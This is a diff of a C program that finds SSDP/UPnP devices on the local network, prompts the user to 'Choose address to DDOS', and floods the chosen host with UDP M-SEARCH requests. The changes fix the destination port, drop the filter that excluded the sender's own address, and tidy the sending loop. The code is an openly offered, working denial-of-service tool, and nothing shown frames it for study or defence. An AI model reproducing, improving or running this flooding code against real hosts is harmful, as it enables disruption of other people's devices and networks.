@@ -29,7 +29,10 @@ const uint32_t get_number_of_interfaces_in(const struct ifaddrs *);
 bool sockaddr_in_equal(const struct sockaddr_in, const struct sockaddr_in);
 
 // Filter the struct sockaddr_in given parameter (i.e del replicate, remove src addr ...)
-int sockaddr_in_filter(struct sockaddr_in **, const int, const struct in_addr *);
+int sockaddr_in_filter(struct sockaddr_in **, const int);
+
+// Equal method between 2 struct in_addr
+bool addr_in_equal(struct in_addr, struct in_addr);
 
 // Returns M-SEARCH request
 const char *get_msearch_request(void);
@@ -229,14 +232,17 @@ int main(void) {
   }
 
   // Filters the list responds_sock_in and returns the new size
-  counter = sockaddr_in_filter(&responds_sock_in, counter, &src_interface);
+  counter = sockaddr_in_filter(&responds_sock_in, counter);
 
-  // Displays address
+  // Displays address, prints self addr
   printf("Choose address to DDOS:\n");
   printf("0\tExit.\n");
-  for(int i = 0; i < counter; i++) printf("%d\t%s\n",(i + 1), inet_ntoa(responds_sock_in[i].sin_addr));
+  for(int i = 0, w = 1; i < counter; i++, w++) {
+      printf("%d\t%s\n", w, inet_ntoa(responds_sock_in[i].sin_addr));
+  }
 
   choice = 0;
+  printf("Choice: ");
   err = scanf("%d", &choice);
   
   if (err == -1) {
@@ -253,25 +259,26 @@ int main(void) {
 
   // DDOS choosen_one address
   struct sockaddr_in choosen_one = responds_sock_in[choice - 1];
+  choosen_one.sin_port = htons(SSDP_PORT); // fix no_port
   printf("Sending %d requests to %s:\n", MAX_REQUEST, inet_ntoa(choosen_one.sin_addr));
   counter = 0;
   
   // Loop
   do {
-      err = sendto(udp_socket, // sending socket
-	       request, // ~ 'message'
-	       (strlen(request) + 1), // length of request
-	       0, // flag
-	       (struct sockaddr *)&choosen_one, // destination
-		   sizeof(choosen_one));
+    err = sendto(udp_socket, // sending socket
+		 request, // ~ 'message'
+		 (strlen(request) + 1), // length of request
+		 0, // flag
+		 (struct sockaddr *)&choosen_one, // destination
+		 sizeof(choosen_one));
 
-      if (err == -1) {
-	perror("Error DDOSing.\n");
-	counter = MAX_REQUEST;
-      }
-      counter++;
-      pourcent = ((double)counter / (double)MAX_REQUEST) * 100;
-      if ((int)pourcent % 5) printf(".....");
+    if (err == -1) {
+      perror("Error DDOSing.\n");
+      counter = MAX_REQUEST;
+    }
+    counter++;
+    pourcent = ((double)counter / (double)MAX_REQUEST) * 100;
+    if ((int)pourcent % 5) printf(".....");
   } while (counter < MAX_REQUEST);
   printf("\nRequests sent!\n");
   
@@ -455,13 +462,11 @@ bool sockaddr_in_equal(const struct sockaddr_in sock_addr1, const struct sockadd
 }
 
 // Filter the struct sockaddr_in given parameter (i.e del replicate ...)
-int sockaddr_in_filter(struct sockaddr_in **list, const int max_size, const struct in_addr * except) {
-  struct sockaddr_in *history = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in) *max_size),
-    **temp = NULL;
+int sockaddr_in_filter(struct sockaddr_in **list, const int max_size) {
+  struct sockaddr_in *history = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in) * max_size);
   int index = 0,
     status = EXIT_FAILURE,
-    history_index = 1;
-  const char *src_ip = inet_ntoa(*except);
+    history_index = 0;
   bool exist = false;
   
   if (max_size == 0 || list == NULL) {
@@ -469,14 +474,11 @@ int sockaddr_in_filter(struct sockaddr_in **list, const int max_size, const stru
     free(list);
     exit(status);
   }
-  
-  history[0] = (*list)[0];
-  
-  for (int x = 1; x < max_size; x++) {
+
+  for (int x = 0; x < max_size; x++) {
     exist = false;
     for (int c = 0; c < history_index && !exist; c++) {
-      if (sockaddr_in_equal(history[c], (*list)[x]) ||
-	  strcmp(src_ip, inet_ntoa((*list)[x].sin_addr)) == 0) {
+      if (sockaddr_in_equal(history[c], (*list)[x])) {
 	exist = true;
       }
     }
@@ -487,13 +489,31 @@ int sockaddr_in_filter(struct sockaddr_in **list, const int max_size, const stru
   }
 
   free(*list);
-  *list = malloc(sizeof(struct sockaddr_in) * history_index);
+  *list = (struct sockaddr_in *)malloc(sizeof(struct sockaddr_in) * history_index);
   
   for (int x = 0; x < history_index; x++) (*list)[x] = history[x];
   
   free(history);
 
   return history_index;
+}
+
+// Equal method between 2 struct in_addr
+bool addr_in_equal(struct in_addr addr1, struct in_addr addr2) {
+  const  char *ip_addr1 = inet_ntoa(addr1);
+  const char *ip_addr2 = inet_ntoa(addr2);
+
+  if (strlen(ip_addr1) != strlen(ip_addr2)) return false;
+
+  int length = strlen(ip_addr1);
+
+  for (int c = 0; c < length; c++) {
+    if (ip_addr1[c] != ip_addr2[c]) {
+      return false;
+    }
+  }
+
+  return true;
 }
 
 // Returns M-SEARCH request
